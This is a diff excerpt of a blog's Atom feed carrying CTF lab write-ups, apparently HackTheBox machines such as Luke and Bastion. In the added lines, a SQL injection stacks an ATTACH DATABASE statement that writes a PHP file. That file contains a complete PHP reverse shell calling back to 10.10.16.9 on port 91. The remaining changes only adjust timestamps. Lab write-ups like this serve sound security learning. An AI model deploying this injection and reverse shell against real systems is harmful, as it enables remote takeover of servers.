 root@pentestbox:~# python break_rc4.py 32mbgmnqsu2rs11jcnbepejcis {REQUEST_HERE_ENCODED}{PAYLOAD_HERE_DOUBLE_ENCODED}
+&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+Opened database successfully
+Query : SELECT * FROM books WHERE id=1;ATTACH DATABASE './d9e28afcf0b274a5e0542abb67db0784/db.php' AS d; CREATE TABLE d.p (pp TEXT); INSERT INTO d.p (pp) VALUES ('&amp;lt;?php set_time_limit(0);$i=&quot;10.10.16.9&quot;;$p=91;$cs=1400;$sh=&quot;/bin/sh -i&quot;;$d=null;$e=null;$s=fsockopen($i,$p,$en,$es,30);$ds=array(0=&amp;gt;array(&quot;pipe&quot;,&quot;r&quot;),1=&amp;gt;array(&quot;pipe&quot;,&quot;w&quot;),2=&amp;gt;array(&quot;pipe&quot;,&quot;w&quot;));$pr=proc_open($sh,$ds,$pp);if(!is_resource($pr)){exit(1);}stream_set_blocking($pp[0],0);stream_set_blocking($pp[1],0);stream_set_blocking($pp[2],0);stream_set_blocking($s,0);while(1){if(feof($s)){break;}if(feof($pp[1])){break;}$r=array($s,$pp[1],$pp[2]);$n=stream_select($r,$d,$e,null);if(in_array($s,$r)){$in=fread($s,$cs);fwrite($pp[0],$in);}if(in_array($pp[1],$r)){$in=fread($pp[1],$cs);fwrite($s,$in);}if(in_array($pp[2],$r)){$in=fread($pp[2],$cs);fwrite($s,$in);}}fclose($s);fclose($pp[0]);fclose($pp[1]);fclose($pp[2]);proc_close($pr); ?&amp;gt;');-- 
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Then, let’s call the created page:&lt;/p&gt;
@@ -666,7 +1048,7 @@ root
  <entry>
    <title>Luke - 10.10.10.137</title>
    <link href="http://localhost:4000/2019/09/20/luke/"/>
-   <updated>2019-09-20T00:00:00+02:00</updated>
+   <updated>2019-09-20T00:00:00+01:00</updated>
    <id>http://localhost:4000/2019/09/20/luke</id>
    <content type="html">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;
 
@@ -856,7 +1238,7 @@ the flag is already retrieved.&lt;/p&gt;
  <entry>
    <title>Bastion - 10.10.10.134</title>
    <link href="http://localhost:4000/2019/09/13/bastion/"/>
-   <updated>2019-09-13T00:00:00+02:00</updated>
+   <updated>2019-09-13T00:00:00+01:00</updated>
    <id>http://localhost:4000/2019/09/13/bastion</id>
    <content type="html">&lt;h1 id=&quot;user&quot;&gt;USER&lt;/h1&gt;
 
